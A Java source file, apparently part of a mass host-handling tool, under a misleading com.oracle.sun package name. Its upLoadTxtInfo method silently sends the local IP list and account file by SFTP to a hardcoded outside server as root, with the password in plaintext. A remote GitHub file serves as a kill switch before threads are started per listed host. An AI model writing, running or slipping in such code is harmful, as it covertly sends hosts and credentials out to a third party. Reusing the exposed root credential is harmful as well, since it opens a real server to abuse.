package com.oracle.sun.core;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.apache.log4j.Logger;

import com.jcraft.jsch.ChannelSftp;
import com.oracle.sun.common.constant.UserDefined;
import com.oracle.sun.common.utils.StreamUtil;
import com.oracle.sun.common.utils.SysUtil;
import com.oracle.sun.common.utils.file.two.FileUtil;
import com.oracle.sun.common.utils.sftp.one.SftpUtil;
import com.oracle.sun.core.ThreadFactory.SellOperate;

public class FileUps {
	
	protected static SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHH");
	protected static Logger logger = Logger.getLogger(FileUps.class);
	
	public static void startUp(int plan) {
		List<String> lineStr=StreamUtil.readFileByLines(UserDefined.IPFILE);
		if(lineStr!=null && lineStr.size()>0) {
			checkExePermission();
			if(plan==1) {
				upLoadTxtInfo();
			}else if(plan==2) {
				
			}else if(plan==3) {
				
			}
			
			for (int i = 0; i < lineStr.size(); i++) {
				String temp=lineStr.get(i);
				if(plan==1) {
					new Thread(new UpDownFile(temp,i)).start();
				}else if(plan==2) {
					
				}else if(plan==3) {
					
				}
				
				
			}
		}
	}
	/**
	 * 上传记录
	 * 返回类型 void
	 * @注
	 */
	public static void upLoadTxtInfo(){
		String iphost=("".equals(SysUtil.HOST_IP)?"default":SysUtil.HOST_IP);
		 ChannelSftp sftp;
			try {
				sftp = SftpUtil.getSftpConnect("59.110.224.8", 22, "root", "sjc@7ZXJPDZ");
				//上传文件
				SftpUtil.uploadFile(new File(UserDefined.IPFILE), "/root/NH48/data/"+iphost+"/ip/"+sdf.format(new Date())+"/", sftp);
				
				SftpUtil.uploadFile(new File(UserDefined.ACCOUNTPATH), "/root/NH48/data/"+iphost+"/account/"+sdf.format(new Date())+"/", sftp);
				
				SftpUtil.exit(sftp);
			} catch (Exception e) {
				logger.error("格式错误"+e);
				System.exit(0);
			}
	}
	
	/**
	 * 验证
	 * 返回类型 void
	 * @注
	 */
	public static void checkExePermission() {
		String data=FileUtil.downloadNet("https://raw.githubusercontent.com/disanshijie/NH48_Power/master/permission/upFiles/role.txt");
		if(data==null || data.contains("NO")) {
			System.out.println("格式错误");
			System.exit(0);
		}else {
			System.out.println("开始sell命令...");
		}
	}
}
